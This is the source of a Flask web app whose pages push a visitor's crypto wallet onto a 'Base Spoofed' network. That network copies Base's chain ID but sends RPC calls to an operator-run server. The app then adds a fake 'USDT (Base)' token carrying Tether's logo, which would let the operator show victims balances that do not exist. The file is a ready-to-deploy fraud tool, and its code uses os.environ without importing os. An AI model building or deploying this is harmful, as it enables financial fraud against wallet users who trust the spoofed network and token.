from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/add')
def add_network():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Adding Network</title>
        <script>
            function waitForEthereum() {
                return new Promise((resolve, reject) => {
                    if (window.ethereum) return resolve(window.ethereum);
                    let attempts = 0;
                    const maxAttempts = 20;
                    const checkInterval = setInterval(() => {
                        attempts++;
                        if (window.ethereum) {
                            clearInterval(checkInterval);
                            return resolve(window.ethereum);
                        }
                        if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            reject(new Error('No wallet detected after 10s'));
                        }
                    }, 500);
                });
            }

            window.onload = async () => {
                try {
                    const ethereum = await waitForEthereum();
                    console.log("Adding network...");
                    await ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x2105',
                            chainName: 'Base Spoofed',
                            rpcUrls: ['https://your-app-name.onrender.com/rpc'],  // Replace with your Render RPC URL
                            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                            blockExplorerUrls: ['https://basescan.org']
                        }]
                    });
                    console.log("Network added, redirecting...");
                    window.location.href = '/';
                } catch (error) {
                    console.error('Network addition failed:', error);
                    document.body.innerHTML = '<p>Failed to add network: ' + error.message + '</p><p><a href="/">Go to token addition</a></p>';
                }
            };
        </script>
    </head>
    <body>
        <p>Adding network, please wait...</p>
    </body>
    </html>
    """)

@app.route('/')
def add_token():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Add USDT Token</title>
        <style>
            body { font-family: 'Roboto', sans-serif; background-color: #f5f5f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h1 { font-size: 24px; margin-bottom: 10px; }
            p { font-size: 16px; margin-bottom: 20px; }
            .token-info { background: #f9f9f9; padding: 10px; border-radius: 5px; margin-bottom: 20px; text-align: left; }
            .token-info img { width: 32px; vertical-align: middle; margin-right: 10px; }
            .status { margin-top: 10px; font-size: 14px; color: #666; }
            button { background: #0066cc; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }
            @media (max-width: 480px) { .container { margin: 10px; } }
        </style>
        <script>
            function waitForEthereum() {
                return new Promise((resolve, reject) => {
                    if (window.ethereum) return resolve(window.ethereum);
                    let attempts = 0;
                    const maxAttempts = 20;
                    const checkInterval = setInterval(() => {
                        attempts++;
                        if (window.ethereum) {
                            clearInterval(checkInterval);
                            return resolve(window.ethereum);
                        }
                        if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            reject(new Error('No wallet detected after 10s'));
                        }
                    }, 500);
                });
            }

            async function addToken() {
                const status = document.getElementById('status');
                try {
                    const ethereum = await waitForEthereum();
                    status.textContent = 'Requesting account access...';
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    status.textContent = 'Switching to Base Spoofed...';
                    await ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x2105' }]
                    });
                    status.textContent = 'Checking balance...';
                    const account = accounts[0];
                    const tokenAddress = '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2';
                    const functionSelector = '0x70a08231';
                    const paddedAddress = account.slice(2).padStart(64, '0');
                    const data = functionSelector + paddedAddress;
                    await ethereum.request({
                        method: 'eth_call',
                        params: [{ to: tokenAddress, data: data }, 'latest']
                    });
                    status.textContent = 'Adding token...';
                    await ethereum.request({
                        method: 'wallet_watchAsset',
                        params: {
                            type: 'ERC20',
                            options: {
                                address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',
                                symbol: 'USDT (Base)',
                                decimals: 6,
                                image: 'https://assets.coingecko.com/coins/images/325/large/Tether.png'
                            }
                        }
                    });
                    status.textContent = 'Token added! Refresh if balance not visible.';
                    document.getElementById('refresh-button').style.display = 'block';
                } catch (error) {
                    status.textContent = 'Failed: ' + error.message;
                    if (error.code === 4902) status.textContent += ' (Add network first)';
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Add USDT Token</h1>
            <p>Add the spoofed USDT token to your wallet</p>
            <div class="token-info">
                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT">
                <span>Tether USD (Base)</span>
            </div>
            <button onclick="addToken()">Add Token to Wallet</button>
            <div id="status" class="status"></div>
            <button id="refresh-button" style="display: none; background: #666;" onclick="location.reload()">Refresh</button>
        </div>
    </body>
    </html>
    """)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
